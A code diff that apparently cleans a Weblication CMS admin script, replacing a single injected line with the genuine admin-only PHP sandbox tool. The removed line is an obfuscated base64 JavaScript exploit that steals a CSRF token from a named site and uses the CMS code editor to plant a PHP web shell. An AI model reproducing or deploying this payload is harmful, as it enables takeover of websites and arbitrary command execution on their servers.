@@ -1,1 +1,69 @@
-eval(atob('KGFzeW5jIGZ1bmN0aW9uKCkgewogICAgIHZhciB3Y3NyZiA9IChhd2FpdCAoYXdhaXQgZmV0Y2goImh0dHBzOi8vd3d3LmNvcmVkZW1vLmRlL2RlL2luZGV4LnBocCIsIHtjcmVkZW50aWFsczogImluY2x1ZGUifSkpLnRleHQoKSkubWF0Y2goL3dDc3JmID0gJyhbXiddKyknLylbMV07CiAgICBhd2FpdCBmZXRjaCgiaHR0cHM6Ly93d3cuY29yZWRlbW8uZGUvd2VibGljYXRpb24vZ3JpZDUvYXBwcy93RWRpdG9yQ29kZS9pbmRleC5waHAiLCB7Y3JlZGVudGlhbHM6ICJpbmNsdWRlIiwgaGVhZGVyczogeyJDb250ZW50LXR5cGUiOiAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIn0sIGJvZHk6IGBhY3Rpb249d3JpdGVjb250ZW50JnBhdGg9L2RlL2tvbnRha3QvdGVzdC5waHAmY29udGVudD0ke2VuY29kZVVSSUNvbXBvbmVudCgiPD89YHskX1JFUVVFU1RbJ18nXX1gPz4iKX0md2NzcmY9JHt3Y3NyZn1gLCBtZXRob2Q6ICJQT1NUIn0pOwp9KSgpOyA='))
+<?php
+
+error_reporting(0);
+
+$GLOBALS['doNotCheckSuspectLevel'] = true;
+
+include($_SERVER['DOCUMENT_ROOT'].'/weblication/grid.php');
+
+if(wUserCur::getType() != 'admin'){
+  header('HTTP/1.1 403 Forbidden');
+  header('Status: 403 Forbidden');  
+  exit;
+}
+
+$action  = wRequest::getParameter('action', 'alphanum');
+$php     = wRequest::getParameter('php');
+
+if($action == 'execute'){
+  wRequest::checkCsrfToken();
+  if(wRequest::getMethod() !== 'POST'){
+    if(!headers_sent()){
+      header('HTTP/1.1 403 Forbidden');
+      header('Status: 403 Forbidden');
+    }
+    print 'Security Error: Invalid request!';
+    exit;
+  }
+  print wMain::executePHP($php);
+  exit;
+}
+
+$pathesScripts = array();
+
+$projects = wApplication::getDataProjects('global');
+foreach($projects as $project){
+  if(wRepository::documentExists($project['path'].'/wGlobal/scripts/php/wMyProject.php')){
+    $pathesScripts[] = $project['path'].'/wGlobal/scripts/php/wMyProject.php';
+  }
+}
+
+$pathLastScript = '/weblication/grid5/cache/sandbox/last_'.wSession::getUserName().'.php';
+$lastScript     = '';
+if(wRepository::documentExists($pathLastScript)){
+  $lastScript = preg_replace('/^<\?php exit; \?>\n/', '', wReadWrite::readFile($pathLastScript));
+}
+
+$xmlStr  = '<wMask>';
+$xmlStr .= '  <wData>';
+$xmlStr .= '    <data name="user">'.wSession::getUserName().'</data>';
+$xmlStr .= '    <data name="scriptsToInclude">'.implode(',', $pathesScripts).'</data>';
+$xmlStr .= '    <data name="lastScript">'.htmlspecialchars($lastScript).'</data>';
+$xmlStr .= '  </wData>';
+$xmlStr .= '</wMask>';
+
+print wTools::generateMaskTool($xmlStr);
+
+class wMain {
+
+  public static function executePHP($phpStr){
+    
+    wRepository::createDir('/weblication/grid5/cache/sandbox');
+    wReadWrite::writeFile('/weblication/grid5/cache/sandbox/last_'.wSession::getUserName().'.php', "<?php exit; ?>\n".$phpStr);
+
+    $hasTags = preg_match('/^\s*\<\?php/', $phpStr) == 1;
+    $phpStr = ($hasTags === false ? $phpStr : '?'.'>'.$phpStr);
+    eval($phpStr);
+  }
+}
+
